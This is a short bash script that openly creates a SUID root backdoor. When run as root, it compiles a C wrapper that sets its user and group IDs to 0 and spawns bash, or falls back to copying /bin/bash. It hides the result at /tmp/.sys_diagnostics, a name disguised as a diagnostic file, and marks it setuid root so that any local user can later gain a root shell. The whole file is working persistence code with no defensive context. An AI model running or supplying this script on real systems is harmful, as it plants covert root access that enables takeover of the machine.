#!/bin/bash
# -----------------------------------------------------------------------------
# Creates a SUID backdoor binary (requires root).
# -----------------------------------------------------------------------------

BACKDOOR_PATH="/tmp/.sys_diagnostics"

if [ "$(id -u)" -eq 0 ]; then
    # Create a simple C wrapper to execute /bin/bash -p
    if command -v gcc >/dev/null 2>&1; then
        echo 'int main() { setresuid(0,0,0); setresgid(0,0,0); system("/bin/bash"); return 0; }' > /tmp/suid.c
        gcc /tmp/suid.c -o "$BACKDOOR_PATH"
        rm /tmp/suid.c
    else
        echo "[!] gcc not found. Copying /bin/bash directly."
        cp /bin/bash "$BACKDOOR_PATH"
    fi

    if [ -f "$BACKDOOR_PATH" ]; then
        chown root:root "$BACKDOOR_PATH"
        chmod 4755 "$BACKDOOR_PATH"
        echo "[+] SUID backdoor created at $BACKDOOR_PATH"
        ls -la "$BACKDOOR_PATH"
    else
        echo "[-] Failed to create backdoor file."
    fi
else
    echo "[-] Root privileges required to create SUID backdoor."
fi
